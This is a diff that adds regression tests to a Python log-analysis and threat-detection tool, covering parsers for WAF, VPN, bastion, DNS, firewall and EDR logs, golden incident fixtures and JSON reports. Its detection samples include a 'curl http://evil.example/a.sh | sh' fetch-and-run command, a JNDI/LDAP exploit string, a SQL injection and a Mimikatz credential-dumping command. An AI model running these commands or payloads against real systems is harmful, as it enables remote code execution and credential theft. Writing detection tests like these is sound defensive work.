@@ -10,22 +10,180 @@ from bla.config import THRESHOLDS, Thresholds, load_thresholds, set_thresholds
 from bla.detection import run_detection
 from bla.detection.engine import _dedup_alerts
 from bla.ioc import extract_iocs, format_ioc_report
+from bla.log_sources import LOG_SOURCE_PRIORITIES, format_log_source_priorities
 from bla.models import (
     AnalysisSummary, DetectionAlert, ThreatLevel, TimelineEntry,
 )
 from bla.output.html_report import generate_html_report
+from bla.output.json_report import generate_json_report
 from bla.output.bundle import generate_report_bundle
 from bla.output.sarif_report import generate_sarif_report
 from bla.output.terminal import print_terminal_report
 from bla.parsers import _parse_generic, auto_parse
 from bla.parsers.linux_auth import parse_linux_auth
+from bla.parsers.p0_security import parse_p0_security_json, parse_p0_security_lines
 from bla.parsers.web_access import parse_web_access
 from bla.parsers.windows_evtx import _parse_xml_event, parse_windows_xml
-from bla.rules import reset_rule_cache, set_rule_dirs
-from bla.utils.helpers import is_private_ip, normalize_timestamp, set_syslog_year
+from bla.rules import reset_rule_cache, set_rule_dirs, validate_web_attack_rules
+from bla.utils.helpers import is_private_ip, normalize_timestamp, reset_counter, set_syslog_year
 
 
 class RegressionTests(unittest.TestCase):
+    def test_log_source_priorities_capture_ir_collection_order(self):
+        sources = [(item.name, item.importance) for item in LOG_SOURCE_PRIORITIES]
+        categories = {item.category for item in LOG_SOURCE_PRIORITIES}
+        priorities = [item.priority for item in LOG_SOURCE_PRIORITIES]
+
+        self.assertGreaterEqual(len(sources), 40)
+        self.assertEqual(sources[:4], [
+            ("WAF / Web 安全网关日志", "极高"),
+            ("CDN / SLB / 反向代理访问日志", "极高"),
+            ("Web 服务器 access.log", "极高"),
+            ("业务应用日志", "极高"),
+        ])
+        self.assertEqual(priorities[:18], ["P0"] * 18)
+        self.assertIn(("VPN / SSL VPN / 零信任登录日志", "极高"), sources)
+        self.assertIn(("云平台审计日志", "极高"), sources)
+        self.assertIn(("Webshell 查杀 / 文件完整性日志", "高"), sources)
+        self.assertIn("云与容器", categories)
+        self.assertIn("数据与中间件", categories)
+        self.assertIn("平台与运营", categories)
+
+    def test_log_source_priority_table_is_markdown(self):
+        table = format_log_source_priorities()
+
+        self.assertIn("| 优先级 | 类别 | 类型 | 日志源 | 重要性 | 必备字段 | 研判重点 | 建议时间窗 |", table)
+        self.assertIn("| P0 | 边界入口 | 日志源 | WAF / Web 安全网关日志 | 极高 |", table)
+        self.assertIn("| P1 | Web 与应用 | 日志源 | Web 服务器 error.log | 高 |", table)
+        self.assertIn("云账号接管", table)
+        self.assertIn("P0=第一轮必采", table)
+
+    def test_p0_waf_csv_detects_web_attack(self):
+        content = (
+            "time,src_ip,host,method,uri,action,rule_id,attack_type,status,user_agent\n"
+            "2024-03-15 10:00:00,8.8.8.8,www.example.com,GET,"
+            "\"/login?id=1 UNION SELECT NULL--\",block,942100,SQL Injection,403,sqlmap\n"
+        )
+
+        result = parse_p0_security_lines(content.splitlines(), "waf.csv", parser_hint="csv")
+
+        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
+        self.assertEqual(len(result.events), 1)
+        event = result.events[0]
+        self.assertEqual(event.category, "Web攻击")
+        self.assertEqual(event.rule_name, "SQL注入")
+        self.assertIn("web-attack", event.tags)
+        self.assertIn("waf", event.tags)
+
+    def test_p0_vpn_jsonl_feeds_brute_force_detection(self):
+        lines = [
+            _json.dumps({
+                "log_type": "vpn",
+                "time": f"2024-03-15 10:00:{i:02d}",
+                "user": "alice",
+                "src_ip": "8.8.4.4",
+                "result": "failed",
+                "reason": "bad password",
+            })
+            for i in range(5)
+        ]
+
+        result = parse_p0_security_lines(lines, "vpn.jsonl")
+        summary = run_detection(result.events)
+
+        self.assertEqual(len(result.events), 5)
+        self.assertTrue(all("failed-login" in event.tags for event in result.events))
+        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))
+
+    def test_p0_bastion_key_value_detects_risky_command(self):
+        line = (
+            'time="2024-03-15 10:01:00" type=bastion user=admin '
+            'src_ip=1.1.1.1 target_host=10.0.0.5 '
+            'command="curl http://evil.example/a.sh | sh" result=success'
+        )
+
+        result = parse_p0_security_lines([line], "bastion.log")
+
+        self.assertEqual(len(result.events), 1)
+        self.assertEqual(result.events[0].rule_name, "堡垒机高危命令")
+        self.assertIn("bastion-command", result.events[0].tags)
+        self.assertEqual(result.events[0].host, "10.0.0.5")
+
+    def test_p0_dns_key_value_detects_tunnel_like_query(self):
+        line = (
+            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
+            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR"
+        )
+
+        result = parse_p0_security_lines([line], "dns.log")
+
+        self.assertEqual(len(result.events), 1)
+        self.assertEqual(result.events[0].rule_name, "DNS 隧道/高熵域名")
+        self.assertIn("dns-tunnel", result.events[0].tags)
+
+    def test_p0_firewall_csv_detects_allowed_sensitive_port(self):
+        content = (
+            "time,src_ip,dst_ip,dst_port,action,protocol\n"
+            "2024-03-15 10:03:00,203.0.113.9,10.0.0.9,3389,allow,tcp\n"
+        )
+
+        result = parse_p0_security_lines(content.splitlines(), "firewall.csv", parser_hint="csv")
+
+        self.assertEqual(len(result.events), 1)
+        self.assertEqual(result.events[0].rule_name, "防火墙放行敏感端口访问")
+        self.assertIn("firewall", result.events[0].tags)
+        self.assertEqual(result.events[0].port, 3389)
+
+    def test_p0_edr_json_detects_credential_dumping(self):
+        content = _json.dumps([{
+            "log_type": "edr",
+            "time": "2024-03-15 10:04:00",
+            "host": "win-01",
+            "user": "bob",
+            "severity": "critical",
+            "alert": "Mimikatz credential dumping",
+            "process": "mimikatz.exe",
+            "commandline": "sekurlsa::logonpasswords",
+        }])
+
+        result = parse_p0_security_json(content, "edr.json")
+
+        self.assertEqual(len(result.events), 1)
+        self.assertEqual(result.events[0].level, ThreatLevel.CRITICAL)
+        self.assertIn("malware-indicator", result.events[0].tags)
+        self.assertIn("lsass-dump", result.events[0].tags)
+
+    def test_auto_parse_p0_application_log_detects_exploit_trace(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "application.log"
+            path.write_text(
+                "2024-03-15 10:05:00 ERROR request failed: ${jndi:ldap://evil.example/a}\n",
+                encoding="utf-8",
+            )
+            result = auto_parse(str(path))
+
+        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
+        self.assertEqual(len(result.events), 1)
+        self.assertIn("web-attack", result.events[0].tags)
+
+    def test_p0_security_events_are_promoted_to_alerts(self):
+        lines = [
+            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
+            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR",
+            'time="2024-03-15 10:03:00" type=bastion user=admin '
+            'src_ip=1.1.1.1 target_host=10.0.0.5 command="curl http://evil.example/a.sh | sh"',
+            "time=2024-03-15T10:04:00 log_type=firewall src_ip=203.0.113.9 "
+            "dst_ip=10.0.0.9 dst_port=3389 action=allow protocol=tcp",
+        ]
+
+        result = parse_p0_security_lines(lines, "p0.log")
+        summary = run_detection(result.events)
+        rule_ids = {alert.rule_id for alert in summary.alerts}
+
+        self.assertIn("P0-C2-001", rule_ids)
+        self.assertIn("P0-BASTION-001", rule_ids)
+        self.assertIn("P0-FW-001", rule_ids)
+
     def test_web_payload_with_spaces_is_detected_as_sqli(self):
         content = (
             "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
@@ -507,6 +665,79 @@ web_attacks:
         self.assertEqual(result.log_type, "Web Access Log (Apache/Nginx)")
         self.assertGreater(result.file_size_bytes, 0)
         self.assertEqual(result.events[0].rule_name, "路径遍历")
+
+    # ---- 实战检测工具化：P0 归一化 / enrich / correlation / golden ----
+
+    def test_builtin_rule_metadata_validates_cleanly(self):
+        """内置 YAML 规则必须具备可维护的元数据标准。"""
+        result = validate_web_attack_rules([])
+
+        self.assertGreaterEqual(result["raw_rules"], 3)
+        self.assertEqual(result["errors"], 0)
+        self.assertEqual(result["warnings"], 0)
+
+    def test_p0_events_expose_stable_normalized_fields(self):
+        """P0 解析结果必须暴露统一字段，方便后续 enrich/correlation/report 使用。"""
+        path = Path(__file__).parent / "fixtures" / "p0" / "hvv_chain.jsonl"
+        result = parse_p0_security_lines(path.read_text(encoding="utf-8").splitlines(), path.name)
+        fields = (
+            "source_type", "src_ip", "dst_ip", "asset", "account", "action",
+            "status", "url", "command", "process", "bytes_out", "session_id", "trace_id",
+        )
+
+        self.assertEqual(len(result.events), 6)
+        for event in result.events:
+            for field in fields:
+                self.assertIn(field, event.details)
+
+        summary = run_detection(result.events, profile="cn-hvv")
+        enriched = summary.timeline[0]
+        self.assertIsNotNone(enriched)
+        self.assertTrue(all("event_family" in event.details for event in result.events))
+        self.assertTrue(all("asset_role" in event.details for event in result.events))
+
+    def test_p0_hvv_chain_matches_golden_incident(self):
+        """同一批 P0 样本的告警与 incident 结果必须稳定。"""
+        reset_counter()
+        base = Path(__file__).parent / "fixtures" / "p0"
+        golden = _json.loads((base / "golden_hvv_chain.json").read_text(encoding="utf-8"))
+        result = auto_parse(str(base / "hvv_chain.jsonl"))
+        summary = run_detection(result.events, profile=golden["profile"])
+
+        self.assertEqual(summary.total_events, golden["total_events"])
+        self.assertEqual(sorted({alert.rule_id for alert in summary.alerts}), golden["alert_rule_ids"])
+        self.assertEqual(len(summary.incidents), golden["incident_count"])
+        top = summary.incidents[0]
+        self.assertEqual(top.level.value, golden["top_incident"]["level"])
+        self.assertEqual(top.confidence, golden["top_incident"]["confidence"])
+        self.assertEqual(top.source_types, golden["top_incident"]["source_types"])
+        self.assertEqual(top.attack_phases, golden["top_incident"]["attack_phases"])
+        self.assertGreaterEqual(len(top.timeline), 4)
+        self.assertTrue(top.next_logs)
+
+    def test_p0_benign_noise_does_not_create_high_risk_incident(self):
+        """健康检查、正常堡垒机命令、少量 VPN 输错密码不应升级为案件。"""
+        path = Path(__file__).parent / "fixtures" / "p0" / "benign_noise.jsonl"
+        result = auto_parse(str(path))
+        summary = run_detection(result.events, profile="cn-hvv")
+
+        self.assertEqual(len(summary.alerts), 0)
+        self.assertEqual(len(summary.incidents), 0)
+
+    def test_json_report_contains_incident_case_view(self):
+        """JSON 报告必须包含 incident，便于 explain/API/二次处理。"""
+        base = Path(__file__).parent / "fixtures" / "p0"
+        result = auto_parse(str(base / "hvv_chain.jsonl"))
+        summary = run_detection(result.events, profile="cn-hvv")
+
+        with tempfile.TemporaryDirectory() as tmp:
+            report_path = Path(tmp) / "report.json"
+            generate_json_report([result], summary, str(report_path))
+            data = _json.loads(report_path.read_text(encoding="utf-8"))
+
+        self.assertIn("incidents", data)
+        self.assertEqual(len(data["incidents"]), len(summary.incidents))
+        self.assertIn("next_logs", data["incidents"][0])
 
 
 if __name__ == "__main__":
